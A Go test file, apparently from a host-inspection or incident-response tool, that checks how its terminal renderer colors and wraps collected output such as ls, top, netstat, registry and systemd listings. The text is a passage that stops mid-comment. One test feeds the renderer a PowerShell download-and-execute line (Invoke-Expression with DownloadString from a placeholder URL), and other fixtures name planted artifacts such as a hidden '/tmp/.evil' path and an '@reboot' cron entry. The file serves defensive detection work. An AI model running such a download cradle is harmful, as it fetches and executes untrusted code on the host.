package render

import (
	"bytes"
	"fmt"
	"os"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/charmbracelet/lipgloss"
	"github.com/muesli/termenv"

	"karma/internal/form"
	"karma/internal/model"
	"karma/internal/shape"
)

var ansi = regexp.MustCompile(`\x1b\[[0-9;]*m`)

func plain(s string) string { return ansi.ReplaceAllString(s, "") }

// SyntaxLine is the report's body-line coloring handed to callers outside the
// report: an ls-l row comes back with the ls-l paint and strips back to
// itself, and an unknown syntax stays plain.
func TestSyntaxLine(t *testing.T) {
	row := "drwxr-xr-x 2 root root 4096 Oct 06 12:00 /tmp/sub"
	painted := SyntaxLine("ls-l", row)
	if painted == row {
		t.Fatalf("the ls-l row should be colored: %q", painted)
	}
	if plain(painted) != row {
		t.Fatalf("the paint should not change the text: %q", painted)
	}
	if got := SyntaxLine("no-such-syntax", row); got != row {
		t.Fatalf("an unknown syntax should stay plain: %q", got)
	}
}

// The reading layer lines a listing's columns up before the panel paints it, so
// the lexer reads rows with runs of spaces between the columns too; the name
// span still covers the whole path.
func TestLsLAlignedRow(t *testing.T) {
	row := "drwxr-xr-x  2 root root    4096 Oct 06 12:00 /tmp/sub"
	painted := SyntaxLine("ls-l", row)
	if painted == row {
		t.Fatalf("an aligned ls-l row should be colored: %q", painted)
	}
	if plain(painted) != row {
		t.Fatalf("the paint should not change the text: %q", painted)
	}
	nameAt := strings.Index(row, "/tmp/sub")
	covered := false
	for _, span := range styleLsL(row) {
		if span.Start == nameAt {
			covered = span.End == len(row)
		}
	}
	if !covered {
		t.Fatalf("the name span should cover the whole path: %+v", styleLsL(row))
	}
}

// The test process's stdout is not a terminal, so lipgloss lands in the Ascii
// profile and comparing plain text would verify no coloring at all; pinning the
// 256-color profile makes this package's color assertions real.
func TestMain(m *testing.M) {
	lipgloss.SetColorProfile(termenv.ANSI256)
	os.Exit(m.Run())
}

// A check panel is a half-block left rail: the severity color for signals,
// muted otherwise, the id as the level-two band label and metadata right on
// the first line, and over-long lines soft-wrapped — not one word lost,
// continuation lines sharing the body indent, the rail unbroken. The per-line
// width assertions below also cover the CJK case: a title row carrying a CJK
// badge once shifted the border and collapsed the line width on a real Windows
// host (Server 2025, 146 columns).
func TestCheckPanelSignalRail(t *testing.T) {
	const width = 48
	long := strings.Repeat("allow from 203.0.113.0/24 ", 8)
	result := &model.CheckResult{
		Check:   &model.Check{ID: "listen", Aspect: model.AspectNetwork},
		Outcome: model.Collected,
		Document: model.Document{
			Filtered: []model.FilterCount{{ID: "drop", Count: 3}},
			Sections: []model.Section{{Lines: []model.Line{
				{
					Text: "tcp 0.0.0.0:22", Severity: model.High,
					Matches: []model.Match{{ID: "open", Severity: model.High, Message: "external listener",
						Spans: []model.Span{{Start: 0, End: 3}}}},
				},
				{Text: long, Severity: model.Info},
			}}},
		},
	}
	got := checkPanel(result, 40, width, true)
	lines := strings.Split(got, "\n")
	if len(lines) < 3 {
		t.Fatalf("panel too short: %q", plain(got))
	}
	head := plain(lines[0])
	if !strings.HasPrefix(head, "▌ ") {
		t.Fatalf("a signal panel should start with the half-block rail: %q", head)
	}
	if !strings.Contains(head, "LISTEN") {
		t.Fatalf("the first line should carry the check id: %q", head)
	}
	if !strings.Contains(head, "filtered 3") || strings.Index(head, "LISTEN") > strings.Index(head, "filtered 3") {
		t.Fatalf("metadata should be on the right: %q", head)
	}
	for i, line := range lines {
		if !strings.HasPrefix(plain(line), "▌") {
			t.Fatalf("line %d should carry the rail: %q", i, plain(line))
		}
		if got := lipgloss.Width(line); got > width-1 {
			t.Fatalf("line %d is %d wide, past the right-edge slack: %q", i, got, plain(line))
		}
	}
	if !strings.Contains(got, "⟨external listener⟩") {
		t.Fatalf("a finding row should carry the trailing reason: %q", plain(got))
	}
	// Soft wrap preserves everything: every word of the long line is present,
	// broken across several lines
	body := plain(strings.Join(lines[2:], "\n"))
	for _, word := range []string{"allow", "203.0.113.0/24"} {
		if !strings.Contains(body, word) {
			t.Fatalf("wrapping must not lose content (missing %q): %q", word, body)
		}
	}
	if strings.Count(body, "203.0.113.0/24") != 8 {
		t.Fatalf("all 8 addresses of the long line should survive: %q", body)
	}
	if len(lines)-2 < 4 {
		t.Fatalf("an over-long line should wrap onto several lines, got %d: %q", len(lines)-2, body)
	}
}

// Execution notes such as timeout/failure: with no body they still produce a
// thin grey rail panel, with the red note on the right of the first line.
func TestCheckPanelNoteBlock(t *testing.T) {
	result := &model.CheckResult{
		Check:   &model.Check{ID: "dmesg", Aspect: model.AspectKernel},
		Outcome: model.Failed,
		Note:    "timeout (30s), partial output kept",
		Raw:     "line one\nline two\n",
	}
	got := checkPanel(result, 400, 80, true)
	if got == "" {
		t.Fatal("a check with a note must not stay silent")
	}
	lines := strings.Split(got, "\n")
	if !strings.HasPrefix(plain(lines[0]), "▌ DMESG") || !strings.Contains(plain(lines[0]), "timeout (30s), partial output kept") {
		t.Fatalf("the first line should carry the id and the note: %q", plain(lines[0]))
	}
	noteStyle := style{FG: "9", Bold: true, BG: string(subBandColor)}
	if !strings.Contains(lines[0], noteStyle.Style().Render("timeout (30s), partial output kept")) {
		t.Fatalf("the note should be lit on the band: %q", lines[0])
	}
	if body := plain(strings.Join(lines[1:], "\n")); !strings.Contains(body, "line one") ||
		!strings.Contains(body, "line two") {
		t.Fatalf("a note panel should carry the raw text: %q", body)
	}
}

// A quiet check gets the grey rail; a check that was never collected and one
// collected with no content alike do not appear in the report.
func TestCheckPanelQuietRailAndSkippedLine(t *testing.T) {
	quiet := &model.CheckResult{
		Check:   &model.Check{ID: "passwd", Aspect: model.AspectIdentity},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{
			{Lines: []model.Line{{Text: "root:x:0:0:root:/root:/bin/bash", Severity: model.Info}}},
		}},
	}
	lines := strings.Split(checkPanel(quiet, 40, 80, true), "\n")
	quietRail := mutedStyle.Style().Render("▌")
	for i, line := range lines {
		if !strings.HasPrefix(plain(line), "▌ ") {
			t.Fatalf("a quiet panel should start with the grey rail (line %d): %q", i, plain(line))
		}
		if !strings.HasPrefix(line, quietRail) {
			t.Fatalf("the quiet panel's rail should be muted (line %d): %q", i, line)
		}
	}
	if head := plain(lines[0]); !strings.HasPrefix(head, "▌ PASSWD") {
		t.Fatalf("the first line should start with the id: %q", head)
	}

	skipped := &model.CheckResult{
		Check:         &model.Check{ID: "last-log", Aspect: model.AspectIdentity},
		Outcome:       model.Skipped,
		SkippedLabels: []string{"last", "lastlog"},
	}
	if got := checkPanel(skipped, 40, 80, true); got != "" {
		t.Fatalf("a check that was never collected should stay silent: %q", plain(got))
	}
	empty := &model.CheckResult{
		Check:    &model.Check{ID: "empty", Aspect: model.AspectIdentity},
		Outcome:  model.Collected,
		Document: model.Document{Sections: []model.Section{{}}},
	}
	if got := checkPanel(empty, 40, 80, true); got != "" {
		t.Fatalf("a check collected with no content should stay silent: %q", plain(got))
	}
}

// A section the reading layer kept for its title alone — a rule matched the
// `== path` header and every body row was filtered or below the floor — is
// still a finding: the panel prints the title and its reason.
func TestTitleOnlySectionIsShown(t *testing.T) {
	result := &model.CheckResult{
		Check:   &model.Check{ID: "hidden", Aspect: model.AspectFilesystem},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{{
			Title:        "/tmp/.evil",
			TitleMatches: []model.Match{{ID: "evil-path", Severity: model.High, Message: "hidden payload path"}},
		}}},
	}
	panel := plain(checkPanel(result, 40, 80, true))
	if !strings.Contains(panel, "/tmp/.evil") || !strings.Contains(panel, "hidden payload path") {
		t.Fatalf("a title-only finding lost its text or reason: %q", panel)
	}
}

// The level-one heading band fills the line width, is all uppercase, white on
// dark, and never exceeds the terminal.
func TestHeadingBand(t *testing.T) {
	const width = 60
	band := headingBand("identity", width)
	if got := lipgloss.Width(band); got != width-1 {
		t.Fatalf("the banner should fill %d columns, got %d", width-1, got)
	}
	if text := plain(band); !strings.HasPrefix(text, " IDENTITY") {
		t.Fatalf("the banner should be uppercase: %q", text)
	}
	if !strings.Contains(band, "\x1b[") {
		t.Fatalf("the banner should be colored: %q", band)
	}
	if narrow := headingBand("identity", 12); lipgloss.Width(narrow) != 11 {
		t.Fatalf("a narrow terminal should still be filled: %d", lipgloss.Width(narrow))
	}
}

// The check title is the heading tree's second step (the listing's aspect
// band): the band fills the panel from the rail to the right edge as one
// solid strip, the label is the uppercase id, and body rows carry no band.
func TestCheckPanelHeadIsASubBand(t *testing.T) {
	const width = 60
	result := &model.CheckResult{
		Check:   &model.Check{ID: "listen", Aspect: model.AspectNetwork},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{{Lines: []model.Line{
			{Text: "tcp 0.0.0.0:22", Severity: model.Info},
		}}}},
	}
	panel := checkPanel(result, 40, width, true)
	lines := strings.Split(panel, "\n")
	head := lines[0]
	if got := lipgloss.Width(head); got != railInner(width)+1 {
		t.Fatalf("the head band should fill rail + inner width (%d), got %d", railInner(width)+1, got)
	}
	if !strings.Contains(head, "48;5;238") {
		t.Fatalf("the head should sit on the level-two band: %q", head)
	}
	bandPaintedSpaces := regexp.MustCompile(`\x1b\[[0-9;]*48;5;238[0-9;]*m {2,}`)
	if !bandPaintedSpaces.MatchString(head) {
		t.Fatalf("the band's padding should be painted (solid strip): %q", head)
	}
	if label := plain(head); !strings.Contains(label, " LISTEN") {
		t.Fatalf("the band label should be the uppercase id: %q", label)
	}
	for i, line := range lines[1:] {
		if strings.Contains(line, "48;5;238") {
			t.Fatalf("body line %d should carry no band: %q", i+1, plain(line))
		}
	}

	// Metadata that does not fit beside the label drops to its own band row,
	// aligned with the label, both rows filled edge to edge.
	long := result
	long.Document.Truncated = true
	long.Document.Filtered = []model.FilterCount{{ID: "quiet", Count: 12}}
	long.Check.ID = "last-log"
	narrow := checkPanel(long, 40, 20, true)
	narrowLines := strings.Split(narrow, "\n")
	if plain(narrowLines[0]) == plain(narrowLines[1]) {
		t.Fatalf("the metadata should sit on its own band row:\n%s", plain(narrow))
	}
	for i := 0; i < 2; i++ {
		if got := lipgloss.Width(narrowLines[i]); got != railInner(20)+1 {
			t.Fatalf("narrow band row %d should still fill the panel: %d", i, got)
		}
	}
}

// A body row carrying a token lipgloss cannot break (a base64 argument with no
// separator) must not widen the panel past the line: the row is broken by
// character, and no part of the token is dropped.
func TestCheckPanelBoundsUnbreakableTokens(t *testing.T) {
	blob := strings.Repeat("QUJD", 40) // 160 cells, no break point
	result := &model.CheckResult{
		Check:   &model.Check{ID: "ps", Aspect: model.AspectProcess},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{{Lines: []model.Line{
			{Text: "501 1 0 0 Tue09AM ?? 0:00 x " + blob, Severity: model.Info},
		}}}},
	}
	panel := checkPanel(result, 40, 100, true)
	for index, line := range strings.Split(panel, "\n") {
		if got := lipgloss.Width(line); got > lineWidth(100) {
			t.Fatalf("line %d is %d cells wide: %q", index, got, plain(line))
		}
	}
	if !strings.Contains(plain(panel), "QUJDQUJD") {
		t.Fatal("the token should be broken across lines, not dropped")
	}
}

func TestTableStylerStaysInsideTheLine(t *testing.T) {
	table := newTableStyler(nil, true)
	lines := []string{
		"USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT",
		"root     pts/0    1.2.3.4          21:17    0.00s  0.01s  0.00s w",
	}
	if spans := table.style(lines[0]); spans != nil {
		t.Fatalf("an all-caps header only records column anchors: %v", spans)
	}
	spans := table.style(lines[1])
	if len(spans) == 0 {
		t.Fatal("a data row should get column colors")
	}
	for _, span := range spans {
		if span.Start < 0 || span.End > len(lines[1]) || span.Start >= span.End {
			t.Fatalf("span out of range: %+v line length %d", span, len(lines[1]))
		}
	}

	banner := "21:31:02 up 95 days, 12:16,  3 users,  load average: 1.33, 0.61, 0.28"
	bannerSpans := table.style(banner)
	if len(bannerSpans) != 1 || bannerSpans[0].Start != 0 || bannerSpans[0].End != len(banner) ||
		bannerSpans[0].Style != mutedStyle {
		t.Fatalf("w's uptime banner should be muted whole-line: %+v", bannerSpans)
	}
	short := " 10:20:30 up 12:16,  1 user,  load average: 0.00, 0.01, 0.05"
	if got := table.style(short); len(got) != 1 || got[0].Style != mutedStyle {
		t.Fatalf("an uptime banner under a day should also be muted whole-line: %+v", got)
	}
}

// top -b opens with a summary block (banner, Tasks, %Cpu, MiB Mem) that is
// prose, not columns: the top styler has no cycle fallback, so it stays plain
// until the all-caps process header anchors the table.
func TestTopStylerKeepsTheSummaryPlain(t *testing.T) {
	top := buildLineStyler("top")
	preamble := []string{
		"top - 21:39:12 up 95 days,  3:12,  1 user,  load average: 0.12, 0.34, 0.56",
		"Tasks: 112 total,   1 running, 111 sleeping,   0 stopped,   0 zombie",
		"%Cpu(s):  0.7 us,  0.3 sy,  0.0 ni, 98.9 id,  0.1 wa,  0.0 hi,  0.0 si,  0.0 st",
		"MiB Mem :   7964.0 total,   1234.5 free,   2345.6 used,   4383.9 buff/cache",
		"MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   5618.4 avail Mem",
		"Mem: 12345K used, 6789K free, 0K shrd, 123K buff, 4567K cached",
		"CPU:  0.0% usr  0.0% sys  0.0% nic 99.7% idle  0.0% io  0.0% irq  0.0% sirq",
	}
	for _, line := range preamble {
		if spans := top(line); spans != nil {
			t.Fatalf("a summary line should stay plain: %q -> %v", line, spans)
		}
	}
	header := "    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND"
	if spans := top(header); spans != nil {
		t.Fatalf("the process header only records anchors: %v", spans)
	}
	row := "  1234 root      20   0  1621236 458880  10240 S   0.0  0.3   0:05.32  sshd"
	spans := top(row)
	if len(spans) == 0 {
		t.Fatal("a process row should get column colors")
	}
	if spans[0].Start != strings.Index(row, "1234") {
		t.Fatalf("the first span should color the PID cell: %+v in %q", spans[0], row)
	}
	if last := spans[len(spans)-1]; row[last.Start:last.End] != "0:05.32" {
		t.Fatalf("the last span should color the TIME+ cell: %+v in %q", last, row)
	}
	for _, span := range spans {
		if span.Start < 0 || span.End > len(row) || span.Start >= span.End {
			t.Fatalf("span out of range: %+v line length %d", span, len(row))
		}
	}
}

func TestPaintLineOverlaysLaterSpans(t *testing.T) {
	got := paintLine("0123456789", []paintSpan{
		{Start: 0, End: 10, Style: mutedStyle},
		{Start: 2, End: 4, Style: highStyle},
	})
	if want := highStyle.Style().Render("23"); !strings.Contains(got, want) {
		t.Fatalf("a later span should cover an earlier one: %q", plain(got))
	}
	if want := mutedStyle.Style().Render("01"); !strings.Contains(got, want) {
		t.Fatalf("the leading part should keep the base color: %q", plain(got))
	}
	if want := mutedStyle.Style().Render("456789"); !strings.Contains(got, want) {
		t.Fatalf("the trailing part should return to the base color: %q", plain(got))
	}
}

func TestLsLPermissionBitsPaintedOverMutedBase(t *testing.T) {
	line := "-rw-r--r-- 1 root root 4096 Jan 01 12:34 /tmp/notes.txt"
	painted := paintLine(line, styleLsL(line))
	wBit := style{FG: "3"}.Style().Render("w")
	if !strings.Contains(painted, wBit) {
		t.Fatalf("permission bits should be lit one by one (w yellow): %q", painted)
	}
	clock := style{FG: "2"}.Style().Render("Jan 01 12:34")
	if !strings.Contains(painted, clock) {
		t.Fatalf("a date with a time should be green: %q", painted)
	}
	owners := mutedStyle.Style().Render("-- 1 root root ")
	if !strings.Contains(painted, owners) {
		t.Fatalf("owner and group should be muted: %q", painted)
	}
}

func TestLsmodKeepsUsedByTailPlain(t *testing.T) {
	styler := newLineStyler("lsmod")
	if spans := styler("Module                  Size  Used by"); spans != nil {
		t.Fatalf("the header row should not be painted: %v", spans)
	}
	row := "nvidia_uvm            1310720  2 nvidia_core nvidia"
	tail := strings.Index(row, "nvidia_core")
	spans := styler(row)
	if len(spans) == 0 {
		t.Fatal("a data row should get column colors")
	}
	for _, span := range spans {
		if span.End > tail {
			t.Fatalf("the Used by tail (which may contain spaces) should stay default: %+v row %q", span, row)
		}
	}
	for i, want := range []string{"nvidia_uvm", "1310720", "2"} {
		if !strings.Contains(paintLine(row, spans), tableColumnStyles[i].Style().Render(want)) {
			t.Fatalf("column %d should have its column color: %+v", i, spans)
		}
	}
	legacy := "nvidia 53248 2 nvidia - Live 0xffffffffa0000000"
	if tail := strings.Index(legacy, "Live"); tail > 0 {
		for _, span := range styler(legacy) {
			if span.End > tail {
				t.Fatalf("the state field of /proc/modules should stay default: %+v", span)
			}
		}
	}
}

func TestLineStylerPanicFallsBackToPlain(t *testing.T) {
	boomer := safeLineStyler(func(string) []paintSpan { panic("odd output") })
	if spans := boomer("any line"); spans != nil {
		t.Fatalf("a panic should return no spans: %v", spans)
	}
	if spans := boomer("next line"); spans != nil {
		t.Fatalf("one blow-up should degrade to plain text permanently: %v", spans)
	}
}

func TestPanelRenderPanicFallsBackToPlainBlock(t *testing.T) {
	original := panelRenderer
	defer func() { panelRenderer = original }()
	panelRenderer = func(*model.CheckResult, int, int, bool) string { panic("layout blew up") }
	result := &model.CheckResult{
		Check:   &model.Check{ID: "listen", Aspect: model.AspectNetwork},
		Outcome: model.Collected,
		Raw:     "tcp 0.0.0.0:22\n",
	}
	text, failed := renderPanel(result, 400, 100, true)
	if !failed || text == "" {
		t.Fatalf("a failed render should fall back to the grey block: failed=%v text=%q", failed, plain(text))
	}
	if !strings.Contains(plain(text), "LISTEN") || !strings.Contains(plain(text), "tcp 0.0.0.0:22") {
		t.Fatalf("the fallback block should keep the id and the raw text: %q", plain(text))
	}
}

func TestProgressDoesNotStickToPanels(t *testing.T) {
	var buf lockedBuffer
	check := &model.Check{ID: "listen", Aspect: model.AspectNetwork}
	obs := NewLiveObserver(&buf, []*model.Check{check}, 40, 48, true, true)
	obs.Start()
	obs.CheckStarted(check)
	time.Sleep(150 * time.Millisecond)
	if !strings.Contains(buf.String(), " 0/1 ") {
		t.Fatalf("the progress line should show 0/1 while the check runs: %q", buf.String())
	}
	obs.CheckFinished(check, &model.CheckResult{
		Check:   check,
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{{
			Lines: []model.Line{{
				Text: "tcp 0.0.0.0:22", Severity: model.High,
				Matches: []model.Match{{
					ID: "open", Severity: model.High, Message: "external listener",
					Spans: []model.Span{{Start: 0, End: 3}},
				}},
			}},
		}}},
	})
	time.Sleep(150 * time.Millisecond)
	if !strings.Contains(buf.String(), " 1/1 ") {
		t.Fatalf("the progress line should count the finished check (a channel address would print here): %q", buf.String())
	}
	obs.Close()

	visible := strings.Join(screen(buf.String()), "\n")
	if !strings.Contains(visible, "LISTEN") || !strings.Contains(visible, "▌") {
		t.Fatalf("the check panel should remain:\n%s", visible)
	}
	for _, line := range strings.Split(visible, "\n") {
		if strings.Contains(line, "▌") && strings.Contains(line, "1/1") {
			t.Fatalf("the progress count stuck to the rail: %q", line)
		}
		for _, frame := range spinnerFrames {
			if strings.Contains(line, frame) {
				t.Fatalf("a progress glyph stayed on screen: %q\n%s", line, visible)
			}
		}
	}
}

// lockedBuffer is a bytes.Buffer the test may read while the observer loop
// writes: the loop goroutine owns the writes, and String takes the same lock.
type lockedBuffer struct {
	mu  sync.Mutex
	buf bytes.Buffer
}

func (b *lockedBuffer) Write(p []byte) (int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.buf.Write(p)
}

func (b *lockedBuffer) String() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.buf.String()
}

// screen replays terminal semantics: \r returns to column 0, CSI K clears to
// end of line, newline commits.
func screen(raw string) []string {
	var lines []string
	var cur []rune
	col := 0
	for i := 0; i < len(raw); {
		switch {
		case raw[i] == '\n':
			lines = append(lines, string(cur))
			cur, col = nil, 0
			i++
		case raw[i] == '\r':
			col = 0
			i++
		case strings.HasPrefix(raw[i:], "\033[K"):
			if col < len(cur) {
				cur = cur[:col]
			}
			i += len("\033[K")
		case raw[i] == '\033':
			i++
			for i < len(raw) && (raw[i] < 0x40 || raw[i] > 0x7e) {
				i++
			}
			if i < len(raw) {
				i++
			}
		default:
			r, size := utf8.DecodeRuneInString(raw[i:])
			if col < len(cur) {
				cur[col] = r
			} else {
				cur = append(cur, r)
			}
			col++
			i += size
		}
	}
	if len(cur) > 0 {
		lines = append(lines, string(cur))
	}
	return lines
}

func TestSeverityBorderHue(t *testing.T) {
	if severityBorder(model.Critical) != "1" || severityBorder(model.High) != "9" {
		t.Fatalf("border hues: critical %q high %q", severityBorder(model.Critical), severityBorder(model.High))
	}
	if severityBorder(model.Medium) != "11" || severityBorder(model.Low) != "14" {
		t.Fatalf("border hues: medium %q low %q", severityBorder(model.Medium), severityBorder(model.Low))
	}
}

// Section titles are bold plain text (default color) and hits carry a trailing
// reason; sections are separated by one blank line.
func TestBodyRowsSectionBlocks(t *testing.T) {
	result := &model.CheckResult{
		Check:   &model.Check{ID: "cron", Aspect: model.AspectPersistence},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{
			{
				Title: "/etc/cron.d/evil",
				TitleMatches: []model.Match{{ID: "cron-reboot", Severity: model.High, Message: "reboot trigger",
					Spans: []model.Span{{Start: 5, End: 10}}}},
				Lines: []model.Line{{
					Text: "@reboot cmd", Severity: model.High,
					Matches: []model.Match{{ID: "cron-reboot", Severity: model.High, Message: "reboot trigger",
						Spans: []model.Span{{Start: 0, End: 7}}}},
				}},
			},
			{
				Title: "/etc/crontab",
				Lines: []model.Line{{Text: "daily job", Severity: model.Info}},
			},
		}},
	}
	rows := bodyRows(result, 400, 100, true)
	if got := plain(rows[0]); got != "/etc/cron.d/evil  ⟨reboot trigger⟩" {
		t.Fatalf("the section title should come before the body, with the trailing reason: %q", got)
	}
	if !strings.Contains(rows[0], style{Bold: true}.Style().Render("/etc/")) {
		t.Fatalf("the section title should be bold plain text: %q", rows[0])
	}
	if strings.Contains(rows[0], mutedStyle.Style().Render("/etc/")) {
		t.Fatalf("the section title should no longer be muted: %q", rows[0])
	}
	if got := plain(rows[1]); got != "@reboot cmd  ⟨reboot trigger⟩" {
		t.Fatalf("below the section title comes the body row with its reason: %q", got)
	}
	if rows[2] != "" {
		t.Fatalf("sections should be separated by one blank line: %q", plain(rows[2]))
	}
	if plain(rows[3]) != "/etc/crontab" {
		t.Fatalf("a quiet section title is plain: %q", plain(rows[3]))
	}
}

// The preamble (output before any section header) comes first, separated from
// the section title by one blank line.
func TestBodyRowsPreludeComesFirst(t *testing.T) {
	result := &model.CheckResult{
		Check:   &model.Check{ID: "mixed", Aspect: model.AspectIdentity},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{
			{Lines: []model.Line{{Text: "raw prelude", Severity: model.Info}}},
			{Title: "/etc/passwd", Lines: []model.Line{{Text: "root:x:0:0:", Severity: model.Info}}},
		}},
	}
	rows := bodyRows(result, 400, 100, true)
	if plain(rows[0]) != "raw prelude" {
		t.Fatalf("the preamble should come first: %q", plain(rows[0]))
	}
	if rows[1] != "" || plain(rows[2]) != "/etc/passwd" {
		t.Fatalf("the preamble and the section should be separated by one blank line: %q", plain(strings.Join(rows, "|")))
	}
}

// A failed render falls back to a thin grey rail with the raw text, keeping the
// id and the text.
func TestFallbackPanelKeepsRawText(t *testing.T) {
	result := &model.CheckResult{
		Check:   &model.Check{ID: "listen", Aspect: model.AspectNetwork},
		Outcome: model.Collected,
		Raw:     "tcp 0.0.0.0:22\n",
	}
	text := fallbackPanel(result, 400, 100)
	for _, line := range strings.Split(text, "\n") {
		if !strings.HasPrefix(plain(line), "▌") {
			t.Fatalf("the fallback block should be a grey rail: %q", plain(line))
		}
	}
	if joined := plain(text); !strings.Contains(joined, "LISTEN") || !strings.Contains(joined, "tcp 0.0.0.0:22") {
		t.Fatalf("the fallback block should keep the id and the raw text: %q", joined)
	}
}

func TestRegStyler(t *testing.T) {
	styler := newLineStyler("reg")
	key := `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths`
	if spans := styler(key); len(spans) != 1 || spans[0].Start != 0 || spans[0].End != len(key) {
		t.Fatalf("the key path should be painted whole-line: %+v", spans)
	}
	row := `    url1    REG_SZ    \\Mac\Home\Docs`
	spans := styler(row)
	for _, want := range []struct {
		text   string
		Styler style
	}{
		{"url1", style{FG: "4"}},
		{"REG_SZ", keywordColor},
	} {
		if !strings.Contains(paintLine(row, spans), want.Styler.Style().Render(want.text)) {
			t.Fatalf("the value row should light up %q: %q", want.text, plain(paintLine(row, spans)))
		}
	}
	hexRow := `    0    REG_BINARY    0C,00,00,00`
	if spans := styler(hexRow); !strings.Contains(paintLine(hexRow, spans), dimStyle.Style().Render("0C,00,00,00")) {
		t.Fatalf("hex data should be dimmed: %q", plain(paintLine(hexRow, styler(hexRow))))
	}
	cont := `        00,00,00,00`
	if spans := styler(cont); len(spans) != 1 || spans[0].Style != dimStyle {
		t.Fatalf("a wrapped continuation should be dimmed whole-line: %+v", spans)
	}
}

func TestUSBStyler(t *testing.T) {
	styler := newLineStyler("pipe")
	row := `win2k25-0 SSD | 3&4b87e29&0&000000 | Installed 2025-01-02 03:04:05 | Last Connected 2025-06-07 08:09:10`
	spans := styler(row)
	if len(spans) == 0 {
		t.Fatal("a usb row should be painted")
	}
	painted := paintLine(row, spans)
	if !strings.Contains(painted, style{FG: "4"}.Style().Render("win2k25-0 SSD")) {
		t.Fatalf("the device name should be blue: %q", plain(painted))
	}
	if !strings.Contains(painted, style{FG: "2"}.Style().Render("2025-01-02 03:04:05")) {
		t.Fatalf("a timestamp should be green: %q", plain(painted))
	}
	if !strings.Contains(painted, mutedStyle.Style().Render("Last Connected")) {
		t.Fatalf("a label should be muted: %q", plain(painted))
	}
	bare := `MacBook Pro Camera | 6&3b8d32a8&0&0000`
	if spans := styler(bare); len(spans) == 0 {
		t.Fatal("a row without a timestamp should also be painted")
	}
}

func TestNetstatStyler(t *testing.T) {
	styler := newLineStyler("netstat")
	header := `  Proto  Local Address          Foreign Address        State           PID`
	if spans := styler(header); spans != nil {
		t.Fatalf("a header row only records column anchors: %v", spans)
	}
	row := `  TCP    10.0.0.5:52134         1.2.3.4:443           ESTABLISHED     4321`
	spans := styler(row)
	if len(spans) == 0 {
		t.Fatal("a data row should get column colors")
	}
	for _, span := range spans {
		if span.Start < 0 || span.End > len(row) || span.Start >= span.End {
			t.Fatalf("span out of range: %+v line length %d", span, len(row))
		}
	}
}

func TestPowershellStyler(t *testing.T) {
	styler := newLineStyler("powershell")
	line := `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x/y.ps1')`
	spans := styler(line)
	if len(spans) == 0 {
		t.Fatal("a PowerShell command line should be painted")
	}
	painted := paintLine(line, spans)
	if !strings.Contains(painted, keywordColor.Style().Render("Invoke-Expression")) {
		t.Fatalf("a cmdlet should get the keyword color: %q", plain(painted))
	}
	if !strings.Contains(painted, stringColor.Style().Render(`'http://x/y.ps1'`)) {
		t.Fatalf("a URL string should be blue: %q", plain(painted))
	}
	for _, span := range spans {
		if span.Start < 0 || span.End > len(line) || span.Start >= span.End {
			t.Fatalf("span out of range: %+v line length %d", span, len(line))
		}
	}
}

// The unit table's ACTIVE and SUB cells are repainted by meaning once the
// header anchors the columns: alive (active/running) green, finished
// (exited/inactive) faint. A state word inside DESCRIPTION keeps the plain
// table color.
func TestUnitStateCellsPaintedByMeaning(t *testing.T) {
	pad := func(text string, width int) string { return text + strings.Repeat(" ", width-len(text)) }
	header := pad("UNIT", 16) + pad("LOAD", 7) + pad("ACTIVE", 9) + pad("SUB", 11) + "DESCRIPTION"
	styler := newLineStyler("units")
	if spans := styler(header); spans != nil {
		t.Fatalf("the header should only record anchors: %v", spans)
	}
	hasSpan := func(spans []paintSpan, line, word string, want style) bool {
		start := strings.Index(line, word)
		for _, span := range spans {
			if span.Start == start && span.End == start+len(word) && span.Style == want {
				return true
			}
		}
		return false
	}
	covered := func(spans []paintSpan, start, end int) bool {
		for _, span := range spans {
			if span.Start <= start && span.End >= end {
				return true
			}
		}
		return false
	}

	running := pad("nginx.service", 16) + pad("loaded", 7) + pad("active", 9) + pad("running", 11) +
		"A high performance web server"
	spans := styler(running)
	if !hasSpan(spans, running, "active", style{FG: "2"}) ||
		!hasSpan(spans, running, "running", style{FG: "2"}) {
		t.Fatalf("active/running should be painted green: %+v", spans)
	}
	exited := pad("certbot.service", 16) + pad("loaded", 7) + pad("active", 9) + pad("exited", 11) +
		"Certbot renewal"
	spans = styler(exited)
	if !hasSpan(spans, exited, "active", style{FG: "2"}) || !hasSpan(spans, exited, "exited", dimStyle) {
		t.Fatalf("active should stay green and exited should go Faint: %+v", spans)
	}
	desc := pad("sshd.service", 16) + pad("loaded", 7) + pad("active", 9) + pad("running", 11) +
		"daemon that keeps users running"
	spans = styler(desc)
	at := strings.LastIndex(desc, "running")
	if covered(spans, at, at+len("running")) {
		t.Fatalf("a state word inside DESCRIPTION should stay default: %+v", spans)
	}
	// dead is the state systemd leaves a unit it gave up on in: it has to read
	// apart from both the alive states and the finished ones.
	dead := pad("grub.service", 16) + pad("loaded", 7) + pad("inactive", 9) + pad("dead", 11) +
		"GRUB failed boot detection"
	spans = styler(dead)
	if !hasSpan(spans, dead, "dead", unitStateStyles["dead"]) {
		t.Fatalf("dead should be painted by its own state: %+v", spans)
	}
	if unitStateStyles["dead"] == dimStyle || unitStateStyles["dead"] == unitStateStyles["running"] {
		t.Fatalf("dead wears %+v, one of the colors it has to read apart from", unitStateStyles["dead"])
	}
	// failed keeps the cycling column color: the rules decide what a row means,
	// and the word itself is what a rule reads.
	failed := pad("grub.service", 16) + pad("loaded", 7) + pad("failed", 9) + pad("failed", 11) +
		"GRUB failed boot detection"
	spans = styler(failed)
	if !hasSpan(spans, failed, "failed", tableColumnStyles[2]) {
		t.Fatalf("failed should keep its column color: %+v", spans)
	}
}

// The list-unit-files rows the persistence check collects carry two state words
